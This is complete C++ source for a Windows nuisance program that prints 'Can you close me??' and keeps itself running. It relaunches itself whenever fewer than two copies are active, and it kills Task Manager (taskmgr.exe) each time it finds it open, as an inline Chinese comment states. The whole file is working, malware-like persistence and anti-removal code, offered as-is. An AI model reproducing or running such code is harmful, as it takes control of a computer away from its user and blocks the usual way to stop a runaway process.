#include <iostream>
#include <fstream>
#include <sstream>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

using namespace std;

bool IsMyClone(DWORD processID, const char *filepath)
{
	HANDLE hModule = OpenProcess(PROCESS_QUERY_INFORMATION | 
		PROCESS_VM_READ, true, processID);
	char fullpath[MAX_PATH];
	GetModuleFileNameEx(hModule, NULL, fullpath, MAX_PATH);
	
	if(strcmp(filepath, fullpath) == 0)
		return true;
	else
		return false;
}

bool FindAnother(const char *filepath)
{
	char   fname[_MAX_FNAME];
	char   ext[_MAX_EXT];
	_splitpath(filepath, NULL, NULL, fname, ext); 

	ostringstream filename;
	filename<<fname<<ext;

	HANDLE hps = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	Process32First(hps, &pe);
	
	int count = 0;
	bool found = false;
	do
	{
		if(strcmp(pe.szExeFile, "taskmgr.exe") == 0)	//如果检测到任务管理器打开，结束之
		{
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pe.th32ProcessID);
			if(hProcess!=NULL)
		    {
				TerminateProcess(hProcess,0);
				CloseHandle(hProcess);
			}
		}
		else if(strcmp(pe.szExeFile, filename.str().c_str()) == 0)
		{
			if(IsMyClone(pe.th32ProcessID, filepath) && (++count >= 2))
				found = true;
		}
	}
	while(Process32Next(hps, &pe));
	CloseHandle(hps);

	return found;
}

int main()
{
	ifstream in(_pgmptr, ios::in | ios::binary);
	cout<<"Can you close me??"<<endl;
	while(true)
	{
		if(!FindAnother(_pgmptr))
		{
			ShellExecute(GetDesktopWindow(),"open",_pgmptr, NULL,NULL,SW_SHOW);
		}
		Sleep(200);
	}
}
